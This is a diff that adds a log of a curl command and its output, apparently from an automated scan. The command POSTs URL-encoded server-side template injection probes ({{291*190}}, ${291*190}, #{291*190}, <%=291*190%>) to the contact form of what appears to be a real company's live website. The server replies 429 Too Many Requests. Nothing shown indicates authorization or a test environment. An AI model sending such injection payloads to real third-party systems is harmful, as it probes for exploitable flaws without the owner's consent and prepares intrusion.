@@ -1,0 +1,10 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d cb=%7B%7B291%2A190%7D%7D%24%7B291%2A190%7D%23%7B291%2A190%7D%3C%25%3D291%2A190%25%3E https://www.infinitycapital.bh/contact
+# exit_code: 0
+# ---
+
+Too Many Requests
+
+Too Many Requests
+bom1::7s7lf-1790748681115-e7f212924fa5
+HTTP_STATUS:429
+CTYPE:text/plain; charset=utf-8
